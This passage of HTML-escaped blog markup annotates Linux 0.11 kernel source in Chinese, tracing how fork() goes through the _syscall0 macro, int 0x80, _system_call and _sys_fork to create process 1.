class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;init/main.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(!fork())&lt;/span&gt; &amp;#123;		&lt;span class=&#34;comment&#34;&gt;/* we count on this going ok */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		init(); &lt;span class=&#34;comment&#34;&gt;//进程1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; _syscall0(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt;,fork)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;进入到include/unistd.h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; _syscall0(type,name) \\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;type name(void) \\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;#123; \\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;long __res; \\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;__asm__ volatile (&lt;span class=&#34;string&#34;&gt;&amp;quot;int $0x80&amp;quot;&lt;/span&gt; \\ &lt;span class=&#34;comment&#34;&gt;//int 0x80到哪呀, syscall 在sched_init那里,执行完,特权变0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	: &lt;span class=&#34;string&#34;&gt;&amp;quot;=a&amp;quot;&lt;/span&gt; (__res) \\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	: &lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; (__NR_#&lt;span class=&#34;meta&#34;&gt;#name)); \\ &lt;span class=&#34;comment&#34;&gt;//把name 贴过来&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__res &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) \\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; (type) __res; \\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;errno = -__res; \\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;; \\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然后通过&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; $&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; $&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt; p71 系统调用总入口&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; $&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kernel/system_call.s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.align &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_system_call:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpl $nr_system_calls&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,%eax ;核实独立访问?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ja bad_sys_call&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	push %ds           ;对齐??&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	push %es&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	push %fs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %ecx		&lt;span class=&#34;meta&#34;&gt;# push %ebx,%ecx,%edx as parameters&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %ebx		&lt;span class=&#34;meta&#34;&gt;# to the system call&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl $&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,%edx		&lt;span class=&#34;meta&#34;&gt;# set up ds,es to kernel space&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov %dx,%ds&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov %dx,%es&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl $&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,%edx		&lt;span class=&#34;meta&#34;&gt;# fs points to local data space&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	mov %dx,%fs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	call _sys_call_table(,%eax,&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) ; 从这里过去的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl _current,%eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpl $&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,state(%eax)		&lt;span class=&#34;meta&#34;&gt;# state&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jne reschedule&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpl $&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,counter(%eax)		&lt;span class=&#34;meta&#34;&gt;# counter&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	je reschedule&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret_from_sys_call:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl _current,%eax		&lt;span class=&#34;meta&#34;&gt;# task[0] cannot have signals&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpl _task,%eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	je &lt;span class=&#34;number&#34;&gt;3f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpw $&lt;span class=&#34;number&#34;&gt;0x0f&lt;/span&gt;,CS(%esp)		&lt;span class=&#34;meta&#34;&gt;# was old code segment supervisor ?&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jne &lt;span class=&#34;number&#34;&gt;3f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpw $&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,OLDSS(%esp)		&lt;span class=&#34;meta&#34;&gt;# was stack segment = 0x17 ?&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jne &lt;span class=&#34;number&#34;&gt;3f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl signal(%eax),%ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl blocked(%eax),%ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	notl %ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	andl %ebx,%ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	bsfl %ecx,%ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	je &lt;span class=&#34;number&#34;&gt;3f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	btrl %ecx,%ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl %ebx,signal(%eax)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	incl %ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	call _do_signal&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	popl %eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:	popl %eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	popl %ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	popl %ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	popl %edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pop %fs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pop %es&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pop %ds&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	iret    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_sys_call_table是在这里:include/linux/sys.h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;extern&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; sys_fork(); &lt;span class=&#34;comment&#34;&gt;//对应 kernel/system_call.s中的_sys_fork&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fn_ptr sys_call_table[] = &amp;#123; sys_setup, sys_exit, sys_fork, sys_read,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys_write, sys_open, sys_close, sys_waitpid, sys_creat, sys_link,....&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call的函数对应着这个:kernel/system_call.s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.align &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; ;对齐的意思 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_sys_fork:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	call _find_empty_process ; kernel/fork.c 寻找空的进程任务号 task[i]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	testl %eax,%eax  ;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	js &lt;span class=&#34;number&#34;&gt;1f&lt;/span&gt; ; f d 前后的意思&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	push %gs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %esi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %edi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	call _copy_process ;操作系统核心函数!!!复制进程!!!!!!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	addl $&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;,%esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:	ret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		注意,当_sys_fork执行完之后,会回到 _system_call 继续往下执行,执行到下面一条语句的时候跳转&lt;/p&gt;
&lt;p&gt;​		je 3f           ; 如果当前进程是进程0,跳转到下面的3处执行,现在是进程0,所以跳转&lt;/p&gt;
&lt;p&gt;​		3处最后的iret会把ss、esp、eflags、cs、eip弹出,eip存储的是_syscall0中int $0x80的下一行,也就是if (__res &amp;gt;&amp;#x3D; 0)&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.align &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_system_call:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;...........&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	call _sys_call_table(,%eax,&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) ; 从这里过去的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %eax         ; 回到这里!!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl _current,%eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpl $&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,state(%eax)		&lt;span class=&#34;meta&#34;&gt;# state&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jne reschedule&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpl $&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,counter(%eax)		&lt;span class=&#34;meta&#34;&gt;# counter&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	je reschedule&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret_from_sys_call:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl _current,%eax		&lt;span class=&#34;meta&#34;&gt;# task[0] cannot have signals&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpl _task,%eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	je &lt;span class=&#34;number&#34;&gt;3f&lt;/span&gt;           ; 如果当前进程是进程&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,跳转到下面的&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;处执行,现在是进程&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,所以跳转&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpw $&lt;span class=&#34;number&#34;&gt;0x0f&lt;/span&gt;,CS(%esp)		&lt;span class=&#34;meta&#34;&gt;# was old code segment supervisor ?&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jne &lt;span class=&#34;number&#34;&gt;3f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	cmpw $&lt;span class=&#34;number&#34;&gt;0x17&lt;/span&gt;,OLDSS(%esp)		&lt;span class=&#34;meta&#34;&gt;# was stack segment = 0x17 ?&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	jne &lt;span class=&#34;number&#34;&gt;3f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl &lt;span class=&#34;title function_&#34;&gt;signal&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(%eax)&lt;/span&gt;,%ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl &lt;span class=&#34;title function_&#34;&gt;blocked&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(%eax)&lt;/span&gt;,%ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	notl %ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	andl %ebx,%ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	bsfl %ecx,%ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	je 3f&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	btrl %ecx,%ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	movl %ebx,&lt;span class=&#34;title function_&#34;&gt;signal&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(%eax)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	incl %ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	call _do_signal&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	popl %eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3:	popl %eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	popl %ebx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	popl %ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	popl %edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pop %fs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pop %es&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pop %ds&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	iret&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		这个时候,res就是eax,eax是哪里得到的呢? 是在_system_call的时候(也就是int $0x80的时候),call完了sys_fork的时候,sys_fork返回时,执行的pushl %eax, sys_fork的返回值是last_pid,也就是创建的的pid,此时就是1&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;kernel/system_call.s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.align &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;_system_call:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	call _sys_call_table(,%eax,&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;) ; 从这里过去的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	pushl %eax&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; _syscall0(type,name) \\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;type name(void) \\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;#123; \\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;long __res; \\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;__asm__ volatile (&lt;span class=&#34;string&#34;&gt;&amp;quot;int 